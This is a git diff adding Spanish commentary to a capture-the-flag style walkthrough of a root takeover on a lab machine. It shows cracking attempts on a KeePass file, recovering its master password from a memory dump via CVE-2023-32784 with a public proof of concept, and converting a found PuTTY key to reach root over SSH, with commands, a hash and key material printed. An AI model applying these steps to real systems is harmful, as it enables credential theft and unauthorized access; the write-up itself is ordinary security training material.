@@ -210,25 +210,21 @@ Archive:  RT30000.zip
 1 directory, 3 files
 ```
 
-
-
-
+Abriremos el archivo `passcodes.kdbx` a través de `keepassxc` para visualizarlo en entorno gráfico.
 
 ```bash
 ❯ keepassxc passcodes.kdbx & disown
 ```
 
-
+Verificamos que al acceder al archivo, nos pide credenciales de acceso y no podemos acceder a él sin proporcionarle ninguna.
 
 <figure><img src="../../.gitbook/assets/imagen (6).png" alt=""><figcaption></figcaption></figure>
 
+### Obtaining KeePass password through memory dump (CVE-2023-32784)
 
+Por lo tanto, lo que pensamos es en recuperar el hash de la contraseña del archivo a través de `keepass2john` y posteriormente crackear el hash. En este caso, al parecer la contraseña no se encontraba dentro del diccionario del `rockyou.txt`.
 
-### Obtaining KeePass password through memory dump
-
-
-
-<pre class="language-bash"><code class="lang-bash">// Some code❯ keepass2john passcodes.kdbx > hashes
+<pre class="language-bash"><code class="lang-bash">❯ keepass2john passcodes.kdbx > hashes
 
 ❯ catnp hashes
 passcodes:$keepass$*2*60000*0*5d7b4747e5a278d572fb0a66fe187ae5d74a0e2f56a2aaaf4c4f2b8ca342597d*5b7ec1cf6889266a388abe398d7990a294bf2a581156f7a7452b4074479bdea7*08500fa5a52622ab89b0addfedd5a05c*411593ef0846fc1bb3db4f9bab515b42e58ade0c25096d15f090b0fe10161125*a4842b416f14723513c5fb704a2f49024a70818e786f07e68e82a6d3d7cdbcdc
@@ -242,16 +238,14 @@ Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
 Will run 8 OpenMP threads
 </code></pre>
 
-
-
-
+Revisamos el tipo de archivo que era, y nos percatamos que se trataba de un archivo de `Keepass password database 2.x`.
 
 ```bash
 ❯ file passcodes.kdbx
 passcodes.kdbx: Keepass password database 2.x KDBX
 ```
 
-
+Revisando posibiles vulnerabilidades sobre esta versión de **KeePass**, nos encontramos con el siguiente `CVE-2023-32784`.
 
 {% embed url="https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2023-32784" %}
 
@@ -259,13 +253,9 @@ passcodes.kdbx: Keepass password database 2.x KDBX
 En KeePass v2.x anterior a v2.54, es posible recuperar la contraseña maestra en texto claro a partir de un volcado de memoria, incluso cuando un espacio de trabajo está bloqueado o ya no se ejecuta. El volcado de memoria puede ser un volcado de proceso de KeePass, un archivo de intercambio (pagefile.sys), un archivo de hibernación (hiberfil.sys) o un volcado de RAM de todo el sistema. El primer carácter no se puede recuperar. En la versión 2.54, hay un uso diferente de la API y/o inserción de una cadena aleatoria para la mitigación.
 {% endhint %}
 
-
-
-
+Nos descargamos el proyecto de GitHub para realizar la explotación de la vulnerabilidad, para verificar si funciona o no.
 
 {% embed url="https://github.com/CMEPW/keepass-dump-masterkey" %}
-
-
 
 ```bash
 ❯ git clone https://github.com/CMEPW/keepass-dump-masterkey; cd keepass-dump-masterkey
@@ -277,7 +267,9 @@ remote: Total 9 (delta 0), reused 6 (delta 0), pack-reused 0 (from 0)
 Recibiendo objetos: 100% (9/9), 32.52 KiB | 951.00 KiB/s, listo.
 ```
 
+Al ejecutar el exploit pasándole el archivo `KeePassDumpFull.dmp` que obtuvimos, nos encontramos que al parecer ha logrado obtener lo que parece ser la posible contraseña del archivo de KeePass.
 
+En este caso, el resultado al parecer hay algunos carácteres que parecen no ser de `UTF-8` y por dicho motivo el script no lo interpreta.
 
 ```bash
 ❯ python3 poc.py ../KeePassDumpFull.dmp
@@ -297,25 +289,23 @@ Possible password: ●cdgr●d med fl●de
 Possible password: ●Mdgr●d med fl●de
 ```
 
-
+Al buscarpor internet, nos encontramos que el resultado obtenido en el paso anterior, parece ser que se trata del siguiente.
 
 <figure><img src="../../.gitbook/assets/4159_vmware_oeAupdPFiI.png" alt=""><figcaption></figcaption></figure>
 
-
-
-
+Probamos de acceder con lo que supuestamente parece ser la contraseña del **KeePass** pero tampoco logramos poder acceder a ella.
 
 <figure><img src="../../.gitbook/assets/imagen (7).png" alt=""><figcaption></figcaption></figure>
 
+De casualidad, también probamos de revisar si poniendo la contaseña anterior en minúsculas nos funcionaría o no.
 
+<figure><img src="../../.gitbook/assets/imagen (8).png" alt="" width="531"><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/imagen (8).png" alt=""><figcaption></figcaption></figure>
-
-
+Con la contraseña en minúsculas, logramos obtener acceso a la base de datos de **KeePass**. En el archivo, nos encontramos que hay una clave privada de PuTTY del usuario `root` y también una contraseña en texto plano.
 
 <figure><img src="../../.gitbook/assets/imagen (9).png" alt=""><figcaption></figcaption></figure>
 
-
+Validaremos si la contraseña en texto plano sirve para el usuario`root`. En este caso, las credenciales no son válidas.
 
 ```bash
 ❯ nxc ssh 10.10.11.227 -u 'root' -p 'F4><3K0nd!'
@@ -323,13 +313,9 @@ SSH         10.10.11.227    22     10.10.11.227     [*] SSH-2.0-OpenSSH_8.9p1 Ub
 SSH         10.10.11.227    22     10.10.11.227     [-] root:F4><3K0nd!
 ```
 
-
-
-
-
 ### Converting PPK Key V3 to SSH Private Key (id\_rsa)
 
-
+Nos guardaremos en un archivo llamado `private_key` el contenido de la clave privada de `PuTTY` que nos encontramos en el **KeePass**. Revisando el tipo de archivo del que se trataba, nos encontramos que es un archivo `PuTTY Private Key File V3`.
 
 ```bash
 ❯ cat private_key
@@ -364,11 +350,11 @@ Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
 private_key: PuTTY Private Key File, version 3, algorithm ssh-rsa
 ```
 
-
+Dado que esta clave privada de `PuTTY` no nos serviría para conectarnos al `SSH`, lo que buscamos por  Internet es maneras de convertir esta clave privada a una clave privada de SSH. Nos encontramos con el siguiebnte blog que nos mencionaba el proceso a realizar.
 
 {% embed url="https://medium.com/@arslion/convert-ppk-version-3-to-ssh-private-public-keys-pem-on-linux-ubuntu-4bf2c8db1ef2" %}
 
-
+A través de `puttygen` convertiremos la clave privada `PPK`que disponemos en una clave privada `SSH` (id\_rsa). Una vez convertida, le daremos los permisos necesarios y verificaremos que se ha convertido correctamente.
 
 ```bash
 ❯ puttygen private_key -O private-openssh -o id_rsa
@@ -405,9 +391,7 @@ BE5xsjTZIzI66HH5sX5L7ie7JhBTIO2csFuwgVihqM4M+u7Ss/SL
 -----END RSA PRIVATE KEY-----
 ```
 
-
-
-
+Trataremos de acceder al SSH a través de esta clave privada del usuario `root` y comprobamos que hemos podido conectarnos al equipo. También logramos visualizar la flag de **root.txt**.
 
 ```bash
 ❯ ssh -i id_rsa root@10.10.11.227
